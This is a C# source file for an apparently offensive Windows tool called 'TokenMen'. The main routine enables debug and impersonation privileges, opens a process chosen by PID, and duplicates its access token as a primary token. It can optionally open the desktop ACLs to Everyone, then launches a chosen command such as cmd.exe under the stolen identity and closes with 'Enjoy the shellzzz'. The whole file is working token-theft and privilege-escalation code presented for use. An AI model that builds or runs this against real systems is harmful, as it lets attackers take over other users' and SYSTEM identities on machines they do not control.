using Args;

namespace TokenMen;

public class Program
{
    public static void Main(string[] args)
    {


        string AppName = AppDomain.CurrentDomain.FriendlyName;

        var ParsedArgs = ArgParse.Parse(args);
        if (!ParsedArgs.ParsedOk || args.Length == 0)
        {
            Console.WriteLine($"Usage: {AppName} /pid:<PID> /command:<Program To Launch> [/ChangeACL]");
            Console.WriteLine($"Example: {AppName} /pid:3060 /command:cmd.exe");
            Console.WriteLine("[-] Failed to parse args");
            Console.WriteLine("Try to use /usage, /help, /examples");
            return;
        }
        //if (ParsedArgs.Arguments.ContainsKey("/help"))
        //{
        //    PrettyPrint(Help, Info);
        //    return;
        //}
        //if (ParsedArgs.Arguments.ContainsKey("/usage"))
        //{
        //    PrettyPrint(Usage, Info);
        //    return;
        //}
        //if (ParsedArgs.Arguments.ContainsKey("/examples"))
        //{
        //    PrettyPrint(Examples, Info);
        //    return;
        //}

        // TODO: Parse args add the following:
        //  Interactive mode -   don't spawn new window
        //  ACL-Save         -   Save DACLs before changes
        //  ACL-Restore      -   Restore changed DACLs based on JSON file or user input
        //  ACL-Auto ??      -   Changed DACLs based on impersonated user rather than using Everyone
        // And parse arguments more nicely plzzz
        string _sessId = String.Empty;
        uint sessId = UInt32.MaxValue;
        string executableToLaunch = String.Empty;
        string _PID = String.Empty;

        bool bInteractive = ParsedArgs.Arguments.ContainsKey("/interactive") || ParsedArgs.Arguments.ContainsKey("/i");
        bool bSessId = ParsedArgs.Arguments.TryGetValue("/sessionId", out _sessId) || ParsedArgs.Arguments.TryGetValue("/s", out _sessId);
        bool bCommand = ParsedArgs.Arguments.TryGetValue("/command", out executableToLaunch) || ParsedArgs.Arguments.TryGetValue("/c", out executableToLaunch);
        bool bPid = ParsedArgs.Arguments.TryGetValue("/pid", out _PID) || ParsedArgs.Arguments.TryGetValue("/p", out _PID);
        bool bChangeACL = ParsedArgs.Arguments.TryGetValue("/changeACL", out string DACL);
        //bool bRestoreACL = ParsedArgs.Arguments.TryGetValue("/restore", out string DACL);


        if (!bPid || !bCommand || executableToLaunch == String.Empty)
        {
            Console.WriteLine("[!] Please specify PID and command");
            return;
        }
        // Get PID of a user's process to grab the token from, and command to launch with that token
        if (!uint.TryParse(_PID, out uint targetPID)) 
        {
            Console.WriteLine("[-] Invalid PID");
            return;
        };

        // If we got session ID try uint it
        if (bSessId)
        {
            uint.TryParse(_sessId, out sessId);
        }

        Console.WriteLine($"[!] Using token from PID: {targetPID} to launch: {executableToLaunch}");

        string[] privileges = { SE_DEBUG_NAME, SE_IMPERSONATE_NAME };
        if (!Utils.PrivilegeEnabler(privileges))
            return;


        // Get Handle to the Process chosen by the user
        IntPtr hProc = OpenProcess(PROCESS_ACCESS.PROCESS_QUERY_LIMITED_INFORMATION, false, targetPID);
        if (hProc == IntPtr.Zero)
        {
            Console.WriteLine("[-] OpenProcess Failed. (Error: {0})", GetLastErrorString());
            return;
        }
        Console.WriteLine("[+] Got handle to process");

        // Get Handle to the Process's Token
        var tokenAccessRights = TokenAccessRights.TOKEN_DUPLICATE | TokenAccessRights.TOKEN_QUERY | TokenAccessRights.TOKEN_ASSIGN_PRIMARY;
        bool res = OpenProcessToken(hProc, tokenAccessRights, out IntPtr hToken);
        if (!res)
        {
            Console.WriteLine("[-] Failed to get token handle. (Error: {0})", GetLastErrorString());
            return;
        }
        Console.WriteLine("[+] Got handle to token");

        // Duplicate
        tokenAccessRights = TokenAccessRights.TOKEN_ALL_ACCESS;
        bool dup = DuplicateTokenEx(hToken, tokenAccessRights, IntPtr.Zero,
            SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, TOKEN_TYPE.TokenPrimary, out IntPtr hDupToken);
        if (!dup)
        {
            Console.WriteLine("[-] Failed to duplicate token. (Error: {0})", GetLastErrorString());
            return;
        }
        Console.WriteLine("[+] Token duplicated Successfully");

        // TODO: restore ACL
        if (bChangeACL)
        {
            if (!Acl.ChangeDesktopACL())
            {
                Console.WriteLine("[-] Failed to change ACLs");
                return;
            }
            Console.WriteLine("[+] ACLs changed");
        }

        Launcher launcher = new(hDupToken, executableToLaunch, bInteractive, sessId);
        if (launcher.Launch())
            Console.WriteLine("[+] Enjoy the shellzzz :) ");
    }
}
